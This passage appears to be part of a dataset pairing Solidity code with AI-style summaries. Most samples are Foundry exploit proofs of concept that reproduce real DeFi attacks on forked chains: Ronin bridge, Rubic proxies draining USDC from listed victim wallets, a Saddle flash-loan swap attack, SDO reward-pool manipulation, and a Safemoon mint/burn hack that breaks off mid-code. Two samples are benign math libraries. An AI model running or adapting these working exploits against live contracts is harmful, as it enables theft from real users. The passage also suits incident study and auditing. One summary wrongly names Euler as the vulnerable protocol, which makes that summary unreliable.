hex\"016734b276131c27fa94464db17b44ca517b0a9134b15ee4b776596725741cc7836beea1681dda98a83406515981e1d315d5eba13a0173a5a9688f9f920d7a3f7a1c01155c24a2d7a2ffb02530cf58da40c528301dfc22b21b16267dbf4eba2cd3d087276142bddd1d82404b2e75bd12993606a0c7c7626aa74c4d90bd7e4558fbe4261c01067c5aaba1b8e5bb686cda9efdae909aff86dc83f5be79f13af3ee677fb1791175e0b03401bdf7aa6e604eb995c7670384e6fadef3d687a00fd6d33cd47a0dde1c01dad673b6630394d15f8cca8975351d8272390a6c8bb1cb07cc2b04e8d7ea7a867e56a99e9d0c17a8e0629cebda86ee5a5f8b42610494ad0ed0245ffe9b5287631c012f1fb5b4c2b3718ea69197a5239316fbb9b805be3cdf8420324765ab53144b006b3148921458e629ea254df2c383175ca250e6442b8904a0f50ffdf465f6aa6f1b\"\n    });\n\n    // gasless transaction: \n    // https://medium.com/coinmonks/how-to-implement-gas-less-transactions-on-ethereum-9f9273d2f059  }\n}\n}",
        "summary": "This Solidity code defines a contract called `ContractTest` that imports another contract called `Test.sol` and an interface called `IRoninBridge`. It also defines some addresses for different tokens and a `CheatCodes` contract. \n\nThe `setUp` function sets up a fork of mainnet at a specific block number. \n\nThe `testExploit` function calls two functions on the `IRoninBridge` interface and passes in some specific arguments, which may be an attempt to exploit a vulnerability in the contract. The function then ends with a commented-out code snippet for a gasless transaction.",
        "id": "93a2b200-c763-4005-8400-7567f99d4f15"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/BlockSecTeam/status/1606993118901198849\n// https://twitter.com/peckshield/status/1606937055761952770\n// @TX\n// https://etherscan.io/tx/0x9a97d85642f956ad7a6b852cf7bed6f9669e2c2815f3279855acf7f1328e7d46\n\n\ninterface RubicProxy1{\n    struct BaseCrossChainParams {\n        address srcInputToken;\n        uint256 srcInputAmount;\n        uint256 dstChainID;\n        address dstOutputToken;\n        uint256 dstMinOutputAmount;\n        address recipient;\n        address integrator;\n        address router;\n    }\n    function routerCallNative(BaseCrossChainParams calldata _params, bytes calldata _data) external;\n}\n\ninterface RubicProxy2{\n    struct BaseCrossChainParams {\n        address srcInputToken;\n        uint256 srcInputAmount;\n        uint256 dstChainID;\n        address dstOutputToken;\n        uint256 dstMinOutputAmount;\n        address recipient;\n        address integrator;\n        address router;\n    }\n    function routerCallNative(string calldata _providerInfo, BaseCrossChainParams calldata _params, bytes calldata _data) external;\n}\n\ncontract ContractTest is DSTest{\n    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\n    RubicProxy1 Rubic1 = RubicProxy1(0x3335A88bb18fD3b6824b59Af62b50CE494143333);\n    RubicProxy2 Rubic2 = RubicProxy2(0x33388CF69e032C6f60A420b37E44b1F5443d3333);\n    address integrators = 0x677d6EC74fA352D4Ef9B1886F6155384aCD70D90;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 16260580);\n    }\n\n    function testExploit() external{\n        address[] memory victims = new address[](26);\n        victims[0] = 0x6b8D6E89590E41Fa7484691fA372c3552E93e91b;\n        victims[1] = 0x036B5805F9175297Ec2adE91678d6ea0a1e2272A;\n        victims[2] = 0xED9c18C5311DBB2b757B6913fB3FE6aa22b1A5b0;\n        victims[3] = 0xff266f62a0152F39FCf123B7086012cEb292516A;\n        victims[4] = 0x90d9b9CC1BFB77d96f9a44731159DdbcA824C63D;\n        victims[5] = 0x1dAeB36442d0B0B28e5c018078b672CF9ee9753B;\n        victims[6] = 0xF2E3628f7A85f03F0800712DF3c2EBc5BDb33981;\n        victims[7] = 0xf3f4470d71b94CD74435e2e0f0dE0DaD11eC7C5a;\n        victims[8] = 0x915E88322EDFa596d29BdF163b5197c53cDB1A68;\n        victims[9] = 0xD6aD4bcbb33215C4b63DeDa55de599d0d56BCdf5;\n        victims[10] = 0x2afeF7d7de9E1a991c385a78Fb6c950AA3487dbA;\n        victims[11] = 0x21FeBbFf2da0F3195b61eC0cA1B38Aa1f7105cDb;\n        victims[12] = 0xDbDDb2D6F3d387c0dDA16E197cd1E490543354e1;\n        victims[13] = 0x58709C660B2d908098FE95758C8a872a3CaA6635;\n        victims[14] = 0xD2C919D3bf4557419CbB519b1Bc272b510BC59D9;\n        victims[15] = 0xfE243903c13B53A57376D27CA91360C6E6b3FfAC;\n        victims[16] = 0xd5BD9464eB1A73Cca1970655708AE4F560Efc6D1;\n        victims[17] = 0xd6389E37f7c2dB6De56b92f430735D08d702111E;\n        victims[18] = 0x9f3119BEe3766b2CD25BF3808a8646A7F22ccDDC;\n        victims[19] = 0x8a4295b205DD78Bf3948D2D38a08BaAD4D28CB37;\n        victims[20] = 0xf4BA068f3F79aCBf148b43ae8F1db31F04E53861;\n        victims[21] = 0x48327499E4D71ED983DC7E024DdEd4EBB19BDb28;\n        victims[22] = 0x192FcF067D36a8BC9322b96Bb66866c52C43B43F;\n        victims[23] = 0x82Bdfc6aBe9d1dfA205f33869e1eADb729590805;\n        victims[24] = 0x44a59A1d38718c5cA8cB6E8AA7956859D947344B;\n        victims[25] = 0xD0245a08f5f5c54A24907249651bEE39F3fE7014;\n\n        RubicProxy1.BaseCrossChainParams memory _params1 = RubicProxy1.BaseCrossChainParams({\n            srcInputToken: address(0),\n            srcInputAmount: 0,\n            dstChainID: 0,\n            dstOutputToken: address(0),\n            dstMinOutputAmount: 0,\n            recipient: address(0),\n            integrator: integrators,\n            router: address(USDC)\n        });\n        RubicProxy2.BaseCrossChainParams memory _params2 = RubicProxy2.BaseCrossChainParams({\n            srcInputToken: address(0),\n            srcInputAmount: 0,\n            dstChainID: 0,\n            dstOutputToken: address(0),\n            dstMinOutputAmount: 0,\n            recipient: address(0),\n            integrator: integrators,\n            router: address(USDC)\n        });\n        uint amount;\n        for(uint i = 0; i < 8; i++){\n            uint victimsBalance = USDC.balanceOf(victims[i]);\n            uint victimsAllowance = USDC.allowance(address(victims[i]), address(Rubic1));\n            amount = victimsBalance;\n            if(victimsBalance >= victimsAllowance){\n                amount = victimsAllowance;\n            }\n            bytes memory data = abi.encodeWithSignature(\"transferFrom(address,address,uint256)\", victims[i], address(this), amount);\n            Rubic1.routerCallNative(_params1, data);\n        }\n        for(uint i = 8; i < victims.length; i++){\n            uint victimsBalance = USDC.balanceOf(victims[i]);\n            uint victimsAllowance = USDC.allowance(address(victims[i]), address(Rubic2));\n            amount = victimsBalance;\n            if(victimsBalance >= victimsAllowance){\n                amount = victimsAllowance;\n            }\n            bytes memory data = abi.encodeWithSignature(\"transferFrom(address,address,uint256)\", victims[i], address(this), amount);\n            Rubic2.routerCallNative(\"\", _params2, data);\n        }\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker USDC balance after exploit\",\n            USDC.balanceOf(address(this)),\n            USDC.decimals()\n        );\n        \n\n    }\n    \n\n}",
        "summary": "This code is a Solidity smart contract that attempts to exploit a vulnerability in a Rubic Protocol decentralized exchange proxy contract, as reported by security researchers on Twitter. The contract first specifies two interfaces for interacting with the Rubic Protocol contracts. It then defines a test contract that sets up a test environment, including creating a fork of the Ethereum mainnet. Finally, it defines a test function `testExploit()` that attempts to exploit the vulnerability by transferring USDC tokens from victim addresses to the contract's address using the Rubic Protocol contracts. The contract logs the final balance of USDC tokens held by the contract after attempting the exploit.",
        "id": "a015ef7d-dd40-44dd-8040-5a2e5e85ec02"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ninterface IEuler {\n    function flashLoan(\n        address receiver,\n        address token,\n        uint256 amount,\n        bytes calldata data\n    ) external returns (bool);\n}\n\ninterface ICurve {\n    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external;\n}\n\ninterface ISaddle {\n    function swap(\n        uint8 i,\n        uint8 j,\n        uint256 dx,\n        uint256 min_dy,\n        uint deadline\n    ) external returns (uint);\n}\n\ncontract ContractTest is DSTest {\n    address private constant eulerLoans =\n        0x07df2ad9878F8797B4055230bbAE5C808b8259b3;\n    address private constant usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\n    address private constant susd = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51;\n    address private constant dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;\n    address private constant usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;\n    address private constant saddleUsdV2 =\n        0x5f86558387293b6009d7896A61fcc86C17808D62;\n    address private constant curvepool =\n        0xA5407eAE9Ba41422680e2e00537571bcC53efBfD;\n    address private constant saddlepool =\n        0x824dcD7b044D60df2e89B1bB888e66D8BCf41491;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 14684306);\n    }\n\n    function testExploit() public {\n        IEuler(eulerLoans).flashLoan(\n            address(this),\n            usdc,\n            15000000e6,\n            new bytes(0)\n        );\n        console.log(\"USDC hacked: %s\", IERC20(usdc).balanceOf(address(this)));\n    }\n\n    function onFlashLoan(\n        address initiator,\n        address token,\n        uint256 amount,\n        uint256 fee,\n        bytes calldata data\n    ) external returns (bytes32) {\n        attack();\n\n        //Repay Loan\n        IERC20(usdc).approve(msg.sender, amount + fee);\n        return keccak256(\"ERC3156FlashBorrower.onFlashLoan\");\n    }\n\n    function attack() internal {\n        //Swap USDC to SUSD Via Curve\n        console.log(\"USDC loaned: %s\", IERC20(usdc).balanceOf(address(this)));\n        uint amount = IERC20(usdc).balanceOf(address(this));\n        IERC20(usdc).approve(curvepool, amount);\n        ICurve(curvepool).exchange(1, 3, amount, 1);\n        console.log(\n            \"SUSD exchanged: %s\",\n            IERC20(susd).balanceOf(address(this))\n        );\n\n        //Attack\n        swapToSaddle(IERC20(susd).balanceOf(address(this)));\n        swapFromSaddle();\n\n        //Swap Susd to USDC via curve\n        amount = IERC20(susd).balanceOf(address(this));\n        IERC20(susd).approve(curvepool, amount);\n        ICurve(curvepool).exchange(3, 1, amount, 1);\n        console.log(\n            \"USDC exchanged: %s\",\n            IERC20(usdc).balanceOf(address(this))\n        );\n    }\n\n    function swapToSaddle(uint amountStart) internal {\n        //Swap SUSD for SaddleUSDV2\n        uint amount = amountStart;\n        IERC20(susd).approve(saddlepool, amount);\n        ISaddle(saddlepool).swap(0, 1, amount, 1, block.timestamp);\n        console.log(\n            \"saddleUsdV2 swapped: %s\",\n            IERC20(saddleUsdV2).balanceOf(address(this))\n        );\n    }\n\n    function swapFromSaddle() internal {\n        //Swap SaddleUSDV2 for SUSD\n        uint amount = IERC20(saddleUsdV2).balanceOf(address(this));\n        IERC20(saddleUsdV2).approve(saddlepool, amount);\n        ISaddle(saddlepool).swap(1, 0, amount, 1, block.timestamp);\n        console.log(\"SUSD swapped: %s\", IERC20(susd).balanceOf(address(this)));\n    }\n}\n",
        "summary": "This code is a Solidity contract that allows an attacker to exploit a flash loan vulnerability in the Euler protocol. The contract first imports several interfaces for interacting with other contracts, including Euler, Curve, and Saddle. It then defines a test contract with a function called `testExploit()` that triggers the flash loan through the Euler protocol, and a function called `onFlashLoan()` that is called by the Euler protocol after the loan has been executed. \n\nThe `onFlashLoan()` function uses the flash loan to swap USDC for SUSD using the Curve protocol, then uses Saddle to swap SUSD for SaddleUSDV2, and finally swaps SaddleUSDV2 back to USDC using Curve. The goal is to exploit price discrepancies between the tokens and profit from the trades.",
        "id": "55df601a-4523-4669-bdaf-12dbbb2a3f08"
    },
    {
        "code": "// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity >=0.8.0;\n\n/// @notice Safe unsigned integer casting library that reverts on overflow.\n/// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/utils/SafeCastLib.sol)\n/// @author Modified from OpenZeppelin (https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeCast.sol)\nlibrary SafeCastLib {\n    function safeCastTo248(uint256 x) internal pure returns (uint248 y) {\n        require(x < 1 << 248);\n\n        y = uint248(x);\n    }\n\n    function safeCastTo240(uint256 x) internal pure returns (uint240 y) {\n        require(x < 1 << 240);\n\n        y = uint240(x);\n    }\n\n    function safeCastTo232(uint256 x) internal pure returns (uint232 y) {\n        require(x < 1 << 232);\n\n        y = uint232(x);\n    }\n\n    function safeCastTo224(uint256 x) internal pure returns (uint224 y) {\n        require(x < 1 << 224);\n\n        y = uint224(x);\n    }\n\n    function safeCastTo216(uint256 x) internal pure returns (uint216 y) {\n        require(x < 1 << 216);\n\n        y = uint216(x);\n    }\n\n    function safeCastTo208(uint256 x) internal pure returns (uint208 y) {\n        require(x < 1 << 208);\n\n        y = uint208(x);\n    }\n\n    function safeCastTo200(uint256 x) internal pure returns (uint200 y) {\n        require(x < 1 << 200);\n\n        y = uint200(x);\n    }\n\n    function safeCastTo192(uint256 x) internal pure returns (uint192 y) {\n        require(x < 1 << 192);\n\n        y = uint192(x);\n    }\n    \n    function safeCastTo184(uint256 x) internal pure returns (uint184 y) {\n        require(x < 1 << 184);\n\n        y = uint184(x);\n    }\n\n    function safeCastTo176(uint256 x) internal pure returns (uint176 y) {\n        require(x < 1 << 176);\n\n        y = uint176(x);\n    }\n\n    function safeCastTo168(uint256 x) internal pure returns (uint168 y) {\n        require(x < 1 << 168);\n\n        y = uint168(x);\n    }\n\n    function safeCastTo160(uint256 x) internal pure returns (uint160 y) {\n        require(x < 1 << 160);\n\n        y = uint160(x);\n    }\n\n    function safeCastTo152(uint256 x) internal pure returns (uint152 y) {\n        require(x < 1 << 152);\n\n        y = uint152(x);\n    }\n\n    function safeCastTo144(uint256 x) internal pure returns (uint144 y) {\n        require(x < 1 << 144);\n\n        y = uint144(x);\n    }\n\n    function safeCastTo136(uint256 x) internal pure returns (uint136 y) {\n        require(x < 1 << 136);\n\n        y = uint136(x);\n    }\n\n    function safeCastTo128(uint256 x) internal pure returns (uint128 y) {\n        require(x < 1 << 128);\n\n        y = uint128(x);\n    }\n\n    function safeCastTo120(uint256 x) internal pure returns (uint120 y) {\n        require(x < 1 << 120);\n\n        y = uint120(x);\n    }\n\n    function safeCastTo112(uint256 x) internal pure returns (uint112 y) {\n        require(x < 1 << 112);\n\n        y = uint112(x);\n    }\n\n    function safeCastTo104(uint256 x) internal pure returns (uint104 y) {\n        require(x < 1 << 104);\n\n        y = uint104(x);\n    }\n\n    function safeCastTo96(uint256 x) internal pure returns (uint96 y) {\n        require(x < 1 << 96);\n\n        y = uint96(x);\n    }\n\n    function safeCastTo88(uint256 x) internal pure returns (uint88 y) {\n        require(x < 1 << 88);\n\n        y = uint88(x);\n    }\n\n    function safeCastTo80(uint256 x) internal pure returns (uint80 y) {\n        require(x < 1 << 80);\n\n        y = uint80(x);\n    }\n\n    function safeCastTo72(uint256 x) internal pure returns (uint72 y) {\n        require(x < 1 << 72);\n\n        y = uint72(x);\n    }\n\n    function safeCastTo64(uint256 x) internal pure returns (uint64 y) {\n        require(x < 1 << 64);\n\n        y = uint64(x);\n    }\n\n    function safeCastTo56(uint256 x) internal pure returns (uint56 y) {\n        require(x < 1 << 56);\n\n        y = uint56(x);\n    }\n\n    function safeCastTo48(uint256 x) internal pure returns (uint48 y) {\n        require(x < 1 << 48);\n\n        y = uint48(x);\n    }\n\n    function safeCastTo40(uint256 x) internal pure returns (uint40 y) {\n        require(x < 1 << 40);\n\n        y = uint40(x);\n    }\n\n    function safeCastTo32(uint256 x) internal pure returns (uint32 y) {\n        require(x < 1 << 32);\n\n        y = uint32(x);\n    }\n\n    function safeCastTo24(uint256 x) internal pure returns (uint24 y) {\n        require(x < 1 << 24);\n\n        y = uint24(x);\n    }\n\n    function safeCastTo16(uint256 x) internal pure returns (uint16 y) {\n        require(x < 1 << 16);\n\n        y = uint16(x);\n    }\n\n    function safeCastTo8(uint256 x) internal pure returns (uint8 y) {\n        require(x < 1 << 8);\n\n        y = uint8(x);\n    }\n}\n",
        "summary": "This code is a Solidity library called SafeCastLib that contains multiple functions for safely casting large uint256 values to smaller uint types (e.g. uint32, uint16, etc.) by checking for overflow and underflow exceptions. Each function checks the input value against a predefined upper limit for that type of uint before casting it to the targeted type. If the input value exceeds the limit, the function reverts and throws an exception. This library can be used to prevent unexpected behavior or errors caused by integer overflow or underflow in a smart contract.",
        "id": "3e0df249-6c71-417b-b998-7db1b96ad2aa"
    },
    {
        "code": "pragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n\n\ninterface SdoRewardPOOL{\n    function deposit(uint256 _pid, uint256 _amount) external;\n    function withdraw(uint256 _pid, uint256 _amount) external;\n    function harvestAllRewards() external;\n    function updatePool(uint256 _pid) external;\n    function pendingReward(uint256, address) external returns(uint256);\n}\n\ninterface PolydexRouter{\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n}\n\ncontract depositToken{\n\n    IERC20 SDO = IERC20(0x86BC05a6f65efdaDa08528Ec66603Aef175D967f);\n    IERC20 WMATIC = IERC20(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);\n    IERC20 PLX = IERC20(0x7A5dc8A09c831251026302C93A778748dd48b4DF);\n    IERC20 USDC = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);\n    Uni_Router_V2 Router = Uni_Router_V2(0xe5C67Ba380FB2F70A47b489e94BCeD486bb8fB74);\n    SdoRewardPOOL Pool = SdoRewardPOOL(0x17684f4d5385FAc79e75CeafC93f22D90066eD5C);\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function depositPLX() payable external{\n        address(WMATIC).call{value: 1 ether}(\"\");\n        address [] memory path = new address[](2);\n        path[0] = address(WMATIC);\n        path[1] = address(PLX);\n        WMATIC.approve(address(Router), type(uint).max);\n        PLX.approve(address(Pool), type(uint).max);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            WMATIC.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n        Pool.deposit(uint256(9), PLX.balanceOf(address(this)));\n    }\n\n    function withdrawPLX() external{\n        Pool.withdraw(uint256(9), PLX.balanceOf(address(Pool)));\n    }\n\n    function sellSDO() external{\n        address [] memory path = new address[](2);\n        path[0] = address(SDO);\n        path[1] = address(USDC);\n        USDC.approve(address(Router), type(uint).max);\n        SDO.approve(address(Router), type(uint).max);\n        // require(SDO.balanceOf(address(this)) < type(uint112).max, \"overflow\");\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            // SDO.balanceOf(address(this)),\n            20_000_000_000_000 * 1e18,\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n}\n\ncontract ContractTest is DSTest{\n\n    IERC20 SDO = IERC20(0x86BC05a6f65efdaDa08528Ec66603Aef175D967f);\n    IERC20 WMATIC = IERC20(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);\n    IERC20 PLX = IERC20(0x7A5dc8A09c831251026302C93A778748dd48b4DF);\n    IERC20 WETH = IERC20(0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619);\n    IERC20 USDC = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);\n    Uni_Router_V2 Router = Uni_Router_V2(0xe5C67Ba380FB2F70A47b489e94BCeD486bb8fB74);\n    SdoRewardPOOL Pool = SdoRewardPOOL(0x17684f4d5385FAc79e75CeafC93f22D90066eD5C);\n    Uni_Pair_V2 Pair1 = Uni_Pair_V2(0xD33992A7367523B04949C7693d6506d4a7e19446); // WETH PLX\n    Uni_Pair_V2 Pair2 = Uni_Pair_V2(0x948d4AE4e9Ebf2AC6E787D29B94d0fF440EF2e4D); // WMATIC PLX\n    uint amounts0;\n    uint amounts1;\n    address addressContract;\n    uint reserve0Pair1;\n    uint reserve1Pair1;\n    uint reserve0Pair2;\n    uint reserve1Pair2;\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"polygon\", 16225172); \n    }\n\n    function testExploit() public payable {\n\n        PLX.approve(address(Pool), type(uint).max);\n        WMATIC.approve(address(Router), type(uint).max);\n        (reserve0Pair1, reserve1Pair1, ) = Pair1.getReserves();\n        (reserve0Pair2, reserve1Pair2, ) = Pair2.getReserves();\n        address(WMATIC).call{value: 10000 ether}(\"\");\n        // depost PLX\n        ContractFactory();\n        (bool success, ) = addressContract.call{value: 1 ether}(abi.encodeWithSignature(\"depositPLX()\"));\n        //revert();\n        require(success);\n        // change block.timestamp\n        cheats.warp(block.timestamp + 5 * 60 * 60); \n        amounts0 = PLX.balanceOf(address(Pair1)) - 1 * 1e18;\n        Pair1.swap(amounts0, 0, address(this), new bytes(1));\n        // change block.timestamp\n        cheats.warp(block.timestamp + 5 * 60 * 60 +1);\n        uint amountreward = Pool.pendingReward(uint(9), addressContract);\n        (bool success1, ) = addressContract.call(abi.encodeWithSignature(\"withdrawPLX()\"));\n        require(success1);\n\n        emit log_named_decimal_uint(\n            \"Attacker SDO profit after exploit\",\n            SDO.balanceOf(addressContract),\n            18\n        );\n\n        (bool success2, ) = addressContract.call(abi.encodeWithSignature(\"sellSDO()\"));\n        require(success2);\n        WMATIC.balanceOf(address(this));\n\n        \n\n        emit log_named_decimal_uint(\n            \"Attacker USDC profit after exploit\",\n            USDC.balanceOf(addressContract),\n            6\n        );\n\n    }\n\n    function polydexCall(address sender, uint amount0, uint amount1, bytes calldata data) public{\n        if(msg.sender == address(Pair1)){\n            amounts1 = PLX.balanceOf(address(Pair2)) - 1e18;\n            Pair2.swap(0, amounts1, address(this), new bytes(1));\n            // flashswap callback pair1\n            uint amountPLX0 = PLX.balanceOf(address(this));\n            uint amountBuy = (amounts0 - amountPLX0) * 1011 / 1000 *1000 / 995;\n            buyPLX(amountBuy);\n            PLX.transfer(address(Pair1), PLX.balanceOf(address(this)));\n            // exploiter repay WETH to pair, but i dont konw how get weth on ploygon, weth-wmatic lack of liquidity ,i choose to repay plx \n            // uint PLXInPari1 = PLX.balanceOf(address(Pair1));\n            // uint WETHInPair1 =  WETH.balanceOf(address(Pair1));            \n            // uint amountWETH = \n            //     (reserve0Pair1 * reserve1Pair1 / ((PLXInPari1 * 1000 - (amountPLX0 * 2 * 995 / 1000)) / 1000) - WETHInPair1) * 1000 / 998;\n            // buyWETH(amountWETH);\n            // PLX.transfer(address(Pair1), amountWETH);\n        }\n\n        if(msg.sender == address(Pair2)){\n            //reduced lptoken\n            while(PLX.balanceOf(address(Pool)) > 100){\n            uint256 amount = PLX.balanceOf(address(this));\n            if(PLX.balanceOf(address(this)) * 5 / 1000 > PLX.balanceOf(address(Pool))){\n                amount = PLX.balanceOf(address(Pool)) * 1000 / 5;\n            }\n            Pool.deposit(uint256(9), amount);\n            Pool.withdraw(uint256(9), amount);\n            }\n\n            // flashswap callback pair2          \n            PLX.transfer(address(Pair2), amounts1 * 1000 / 995 +  1e18);\n            \n        }\n        \n        }\n\n    function ContractFactory() public{\n        address _add;\n        bytes memory bytecode = type(depositToken).creationCode;\n        assembly{\n                _add := create2(0, add(bytecode, 32), mload(bytecode), 1)\n            }\n        addressContract = _add;\n    }\n\n    function buyPLX(uint amount) public{\n        address [] memory path = new address[](2);\n        path[0] = address(WMATIC);\n        path[1] = address(PLX);\n        Router.swapTokensForExactTokens(\n            amount,\n            WMATIC.balanceOf(address(this)),\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n\n}",
        "summary": "This code defines two contracts: `depositToken` and `ContractTest`. \n\nThe `depositToken` contract has three functions to deposit and withdraw tokens from a pool and to sell SDO tokens using a Uniswap router on the Polygon network.\n\nThe `ContractTest` contract is a test suite that includes a function `testExploit` which tests for an exploit on the Polygon network by calling various functions on the `depositToken` contract. The function first approves token allowances for the relevant modules, then deposits PLX tokens into a rewards pool, swaps some PLX tokens for a different token (warping the block.timestamp in the process), and finally withdraws from the rewards pool and sells SDO tokens for USDC using the aforementioned Uniswap router. The test function is designed to check if the attacker makes a profit. \n\nThe code declares multiple interfaces and contracts and imports various libraries to access relevant functions and data.",
        "id": "64dcf73c-5273-414a-b0af-e96ec0b396ce"
    },
    {
        "code": "pragma solidity ^0.4.0;\n\nlibrary SafeMath {\n  function sub(uint _base, uint _value)\n    internal\n    pure\n    returns (uint) {\n    assert(_value <= _base);\n    return _base - _value;\n  }\n\n  function add(uint _base, uint _value)\n    internal\n    pure\n    returns (uint _ret) {\n    _ret = _base + _value;\n    assert(_ret >= _base);\n  }\n\n  function div(uint _base, uint _value)\n    internal\n    pure\n    returns (uint) {\n    assert(_value > 0 && (_base % _value) == 0);\n    return _base / _value;\n  }\n\n  function mul(uint _base, uint _value)\n    internal\n    pure\n    returns (uint _ret) {\n    _ret = _base * _value;\n    assert(0 == _base || _ret / _base == _value);\n  }\n}\n",
        "summary": "This code defines a Solidity library called \"SafeMath\" that contains functions for safely performing arithmetic operations (addition, subtraction, multiplication, and division) on unsigned integers. The library includes safety checks, such as ensuring that the result of arithmetic operations do not exceed the bounds of uint type, in order to prevent integer overflow and other security issues.",
        "id": "cfe5b1d9-268a-4de6-b014-9f33ec42a644"
    },
    {
        "code": "pragma solidity ^0.8.13;\n\nimport \"forge-std/Test.sol\";\n\ninterface IUniswapV2Router02 {\n    function WETH() external pure returns (address);\n\n    function routerTrade() external pure returns (address);\n}\n\ninterface ISafemoon {\n    function uniswapV2Router() external returns (IUniswapV2Router02);\n\n    function uniswapV2Pair() external returns (address);\n\n    function bridgeBurnAddress() external returns (address);\n\n    function approve(address spender, uint256 amount) external;\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function mint(address user, uint256 amount) external;\n\n    function burn(address from, uint256 amount) external;\n}\n\ninterface ISafeSwapTradeRouter {\n    struct Trade {\n        uint256 amountIn;\n        uint256 amountOut;\n        address[] path;\n        address payable to;\n        uint256 deadline;\n    }\n\n    function getSwapFees(\n        uint256 amountIn,\n        address[] memory path\n    ) external view returns (uint256 _fees);\n\n    function swapExactTokensForTokensWithFeeAmount(\n        Trade calldata trade\n    ) external payable;\n}\n\ninterface IWETH {\n    function approve(address, uint) external returns (bool);\n\n    function transfer(address, uint) external returns (bool);\n\n    function balanceOf(address) external view returns (uint);\n}\n\ninterface IPancakePair {\n    function swap(\n        uint amount0Out,\n        uint amount1Out,\n        address to,\n        bytes calldata data\n    ) external;\n}\n\ninterface IPancakeCallee {\n    function pancakeCall(\n        address sender,\n        uint amount0,\n        uint amount1,\n        bytes calldata data\n    ) external;\n}\n\ninterface IUniswapV2Pair {\n    function sync() external;\n}\n\ncontract SafemoonAttackerTest is Test, IPancakeCallee {\n    ISafemoon public sfmoon;\n    IPancakePair public pancakePair;\n    IWETH public weth;\n\n    function setUp() public {\n        vm.createSelectFork(\"https://rpc.ankr.com/bsc\", 26854757);\n\n        sfmoon = ISafemoon(0x42981d0bfbAf196529376EE702F2a9Eb9092fcB5);\n        pancakePair = IPancakePair(0x1CEa83EC5E48D9157fCAe27a19807BeF79195Ce1);\n        weth = IWETH(sfmoon.uniswapV2Router().WETH());\n    }\n\n    function testMint() public {\n        vm.rollFork(26854757);\n\n        uint originalBalance = sfmoon.balanceOf(address(this));\n        emit log_named_uint(\"sfmoon balance before:\", originalBalance);\n        assertEq(originalBalance, 0);\n\n        sfmoon.mint(\n            address(this),\n            sfmoon.balanceOf(sfmoon.bridgeBurnAddress())\n        );\n\n        uint currentBalance = sfmoon.balanceOf(address(this));\n        emit log_named_uint(\"sfmoon balance after:\", currentBalance);\n        assertEq(currentBalance, 81804509291616467966);\n    }\n\n    function testBurn() public {\n        vm.rollFork(26864889);\n\n        uint originalBalance = weth.balanceOf(address(this));\n        emit log_named_uint(\"weth balance before:\", originalBalance);\n        assertEq(originalBalance, 0);\n\n        pancakePair.swap(1000 ether, 0, address(this), \"ggg\");\n\n        uint currentBalance = weth.balanceOf(address(this));\n        emit log_named_uint(\"weth balance after:\", currentBalance);\n        assertEq(currentBalance, 27463848254806782408231);\n    }\n\n    function doBurnHack(uint amount) public {\n        swappingBnbForTokens(amount);\n        sfmoon.burn(\n            sfmoon.uniswapV2Pair(),\n            sfmoon.balanceOf(sfmoon.uniswapV2Pair()) - 1000000000\n        );\n        sfmoon.burn(address(sfmoon), sfmoon.balanceOf(address(sfmoon)));\n        IUniswapV2Pair(sfmoon.uniswapV2Pair()).sync();\n        swappingTokensForBnb(sfmoon.balanceOf(address(this)));\n    }\n\n    function pancakeCall(\n        address sender,\n        uint amount0,\n        uint amount1,\n        bytes calldata data\n    ) external {\n        require(msg.sender == address(pancakePair));\n        require(sender == address(this));\n\n        doBurnHack(amount0);\n        weth.transfer(msg.sender, (amount0 * 10030) / 10000);\n    }\n\n    function swappingBnbForTokens(uint256 tokenAmount) private {\n        address[] memory path = new address[](2);\n        path[0] = address(weth);\n        path[1] = address(sfmoon);\n\n        ISafeSwapTradeRouter tradeRouter = ISafeSwapTradeRouter(\n            sfmoon.uniswapV2Router().routerTrade()\n        );\n        weth.approve(address(sfmoon.uniswapV2Router()), tokenAmount);\n\n        uint256 feeAmount = tradeRouter.getSwapFees(tokenAmount, path);\n        ISafeSwapTradeRouter.Trade memory trade = ISafeSwapTradeRouter.Trade({\n            amountIn: tokenAmount,\n            amountOut: 0,\n            path: path,\n            to: payable(address(this)),\n            deadline: block.timestamp\n        });\n        